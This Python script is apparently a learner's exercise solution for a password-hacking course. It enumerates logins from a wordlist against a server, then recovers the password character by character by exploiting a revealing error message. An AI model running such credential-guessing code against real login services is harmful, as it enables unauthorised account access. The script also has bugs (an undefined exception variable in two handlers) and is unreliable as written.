import socket
import sys
import logging
import string
import json


class Logger:
    # STEP 1
    # create a logger object instance
    logger = logging.getLogger()

    # STEP 2
    # specify the lowest boundary for logging
    logger.setLevel(logging.DEBUG)

    # STEP 3
    # set a destination for your logs or a handler
    # here, we choose to print on console (a console handler)
    console_handler = logging.StreamHandler()

    # STEP 4
    # set the logging format for your handler
    log_format = '%(asctime)s | %(levelname)s: %(message)s'
    console_handler.setFormatter(logging.Formatter(log_format))

    # finally, add the handler to the logger
    logger.addHandler(console_handler)

    def info(self, message):
        self.logger.info(message)

    def warning(self, message):
        self.logger.warning(message)

    def error(self, message):
        self.logger.error(message)

    def critical(self, message):
        self.logger.critical(message)


logger = Logger()


def connect_to_server(host, port, logins):
    successful_login = {
        "result": "Connection success!"
    }
    exception_msg = {
        "result": "Exception happened during login"
    }
    try:
        with socket.socket() as client_socket:
            logger.info(f"Attempting to connect to {host}:{port}")
            address = (host, port)
            client_socket.connect(address)
            right_login = attempt_all_logins(logins, client_socket)
            logger.info(f"Right login was found {right_login}")
            characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
            password = ""
            while True:
                found_character = False  # Flag to indicate if a character was found
                for char in characters:
                    current_password = password + char
                    credentials_dict_password = {
                        "login": right_login,
                        "password": current_password
                    }
                    logger.info(f"Trying password: {current_password}")
                    encoded_credentials_file = json.dumps(credentials_dict_password)
                    client_socket.sendall(encoded_credentials_file.encode('utf-8'))

                    response = client_socket.recv(1024).decode('utf-8')
                    decoded_json_response = json.loads(response)

                    if decoded_json_response == exception_msg:
                        password += char
                        found_character = True
                        logger.info(f"Found character '{char}'. Current password: '{password}'")
                        break

                    if decoded_json_response == successful_login:
                        logger.info(f"Successfully logged in with password: '{current_password}'")
                        print(encoded_credentials_file)
                        break

                if not found_character:
                    logger.warning("No more characters could be found. Stopping attempts.")
                    break
    except ConnectionResetError:
        logger.error(f"{e.__class__.__name__} occurred: ConnectionResetError")
    except ConnectionAbortedError:
        logger.error(f"{e.__class__.__name__} occurred: ConnectionAbortedError")
    except socket.error as e:
        logger.error(f"Socket error occurred: {e}")


def attempt_all_logins(logins, client_socket):
    wrong_password_msg = {
        "result": "Wrong password!"
    }
    password = "a"
    for login in logins:
        logger.info(f"Login to check: {login}")

        credentials_dict_login = {
            "login": login,
            "password": password
        }

        encoded_json_file = json.dumps(credentials_dict_login)
        logger.info(f"Encoding of credentials to JSON format")
        try:
            client_socket.sendall(encoded_json_file.encode())
            server_response = client_socket.recv(1024).decode()
            decoded_json_response = json.loads(server_response)
            logger.info(f"Successfully received response from the server & decoded response to string")
            if decoded_json_response == wrong_password_msg:
                logger.info(f"Right login was found")
                return login
            else:
                logger.info(f"Login attempt for {login} failed. Response: {decoded_json_response}")
        except json.JSONDecodeError:
            logger.error("Failed to decode JSON response from the server.")
        except Exception as e:
            logger.error(f"An error occurred: {e}")


def open_file(file_path, mode='r'):
    try:
        logger.info(f"Attempting to open file: {file_path} in mode '{mode}'")
        with open(file_path, mode) as file:
            content = [x.rstrip() for x in file.readlines()]
            logger.info(f"File '{file_path}' opened and read successfully.")
            return content
    except FileNotFoundError:
        logger.error(f"File '{file_path}' not found.")
    except IOError as e:
        logger.error(f"I/O error occurred when handling the file '{file_path}': {e}")
    except Exception as e:
        logger.critical(f"Unexpected error occurred: {e}")


def main():
    filepath = "/Users/tatjana/IdeaProjects/Password Hacker with Python/Password Hacker with Python/task/hacking/logins.txt"
    logins = open_file(filepath)

    # Check if the correct number of command-line arguments are provided
    if len(sys.argv) != 3:
        print("Usage: python hack.py <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    connect_to_server(host, port, logins)

if __name__ == "__main__":
    main()
